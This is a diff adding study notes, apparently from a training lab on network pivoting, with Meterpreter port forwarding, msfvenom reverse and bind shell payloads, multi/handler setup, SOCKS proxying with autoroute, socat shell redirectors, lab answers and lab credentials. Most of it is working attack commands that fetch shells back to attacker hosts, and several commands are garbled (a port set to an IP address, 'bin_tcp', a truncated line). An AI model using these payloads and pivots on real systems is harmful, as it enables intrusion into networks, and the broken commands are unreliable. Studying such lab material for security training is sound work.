@@ -270,3 +270,101 @@ $netstat -antp
 
 \\Reverse Port Forwarding rules
 meterpreter>portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
+\\Configuring & Starting Multi/handler
+meterpreter>bg 
+>set payload windows/x64/meterpreter/reverse_tcp
+>set LPORT 0.0.0.0 >run
+-we can now create a reverse shell payload that will send a conn back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host.
+once our ubuntu server receives this conn it will forward to atks host ip:8081 that we configured
+
+\\Generating the Windows Payload
+$msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
+
+\\Establishing the Meterpreter session
+meterpreter>shell 
+
+<test> What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8080 -f elf -o reverseShell
+Subsequently, students need to start a msfconsole multi handler, specifying the payload and port to match the ones used in the msfvenom payload:
+$msfconsole -q 
+>use exploit/multi/handler
+>set payload linux/x64/meterpreter/reverse_tcp
+>set LHOST 0.0.0.0
+>set LPORT pwnPO >run
+-Thereafter, students need to transfer the msfvenom payload to the Ubuntu pivot host, utilizing the credentials ubuntu:HTB_@cademy_stdnt!:
+$scp reverseShell ubuntu@10.129.104.197:~/
+-Students then need to connect to the Ubuntu pivot host using SSH, utilizing the credentials ubuntu:HTB_@cademy_stdnt!:
+$ssh ubuntu@10.129.104.197
+-Once successfully connected to the pivot host, students need to make the msfvenom payload executable and then run it:
+chmod +x reverseShell
+./reverseShell
+->shell 
+$bash -i 
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+
+e 172.16.5.19 and 172.16.5.129.:
+
+<test> Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)
+Afterward, students need to background the meterpreter session and configure the auxiliary/server/socks_proxy module:
+$bg
+$use auxiliary/server/socks_proxy
+$set SRVPORT 9050
+$set SRVHOST 0.0.0.0
+$set VERSION 4a
+run
+-Students need to make sure that the following Socks4 entry is present in the /etc/proxychains.conf file:
+$Sock4 127.0.0.1 9050
+-Then, from Pwnbox/PMVPN, students need to attach back to their meterpreter session and run autoroute on the 172.16.5.0/23 subnet:
+$sessions -i 1
+$run autoroute -s 172.16.5.0/23
+
+-From the output of autoroute, students will know that 172.16.5.0/255.255.254.0 allows 172.16.5.19 to be reachable from the attack host.
+
+\\\\\\\\\\\\\\\\==============================================
+Socat Redirection with a Reverse shell
+
+-Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.
+\\Starting Socat listener
+$socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.
+
+\\Creating the Windows Payload
+$msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+
+Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.
+\\Starting MSF Console
+$sudo msfconsole
+>use exploit/multi/handler
+>set payload windows/x64/meterpreter/reverse_https
+>set lhost 0.0.0.0 
+>set lport 80
+>run
+We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.
+
+\\Establishing the Meterpreter Session
+$getuid
+
+\\\\\\\\\\\\\\===================================
+Socat Redirection with a Bind shell
+Like the socat reverse-shell redirector, a socat bind-shell redirector forwards connections to a Windows bind shell: the Windows host runs a payload and listens on a port, while socat on the Ubuntu server accepts a Metasploit bind handler and forwards it to that listener. See figure
+
+\\Creating the Windows Payload
+$msfvenom -p windows/x64/meterpreter/bin_tcp -f exe -o backupjob.exe LPORT=8443
+
+-We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.
+\\Starting Socat Bind Shell listener
+$socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
+
+\\Configuring & starting the Bind Multi/handler
+msf6>use exploit/multi/handler
+>set payload windows/x64/meterpreter/bind_tcp
+>set RHOST 10.129.202.64
+>set LPORT 8080
+>run
+-We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
+meterpreter>getuid
+
+\\SSH for Windows: Plink
